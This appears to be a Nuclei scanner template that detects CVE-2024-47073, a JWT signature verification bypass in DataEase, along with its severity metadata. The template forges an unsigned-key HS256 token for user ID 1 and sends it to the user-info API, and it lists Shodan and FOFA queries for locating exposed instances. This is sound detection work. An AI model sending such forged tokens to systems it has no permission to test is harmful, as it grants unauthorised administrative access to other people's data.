id: CVE-2024-47073

info:
  name: DataEase v2.10.2 - JWT Signature Verification Bypass
  author: iamnoooob,pdresearch
  severity: critical
  description: |
    DataEase is an open source data visualization analysis tool that helps users quickly analyze data and gain insights into business trends. In affected versions, the lack of signature verification of JWT tokens allows attackers to forge JWTs, which then allow access to any interface. The vulnerability has been fixed in v2.10.2 and all users are advised to upgrade. There are no known workarounds for this vulnerability.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-47073
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cve-id: CVE-2024-47073
    cwe-id: CWE-347
    epss-score: 0.28152
    epss-percentile: 0.96309
    cpe: cpe:2.3:a:dataease:dataease:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    vendor: dataease
    product: dataease
    shodan-query: http.html:"dataease"
    fofa-query: body="dataease"
  tags: cve,cve2024,dataease,jwt

variables:
  payload: '{"uid":1,"oid":1,"exp":{{unix_time(1000)}}}'
  token: '{{generate_jwt(payload,"HS256","random") }}'

http:
  - raw:
      - |
        GET /de2api/user/info HTTP/1.1
        Host: {{Hostname}}
        X-DE-TOKEN: {{token}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - data
          - '"oid":"1"'
          - code
        condition: and

      - type: status
        status:
          - 200
# digest: 490a0046304402204bb697ae0bce83eb345879c2edd456a4300436b15ffda390867c0f34d27fce88022028ab0bd900d84d5cf66932f81b8608847579341a28096f956f215835fcc7c37a:922c64590222798bb761d5b6d8e72950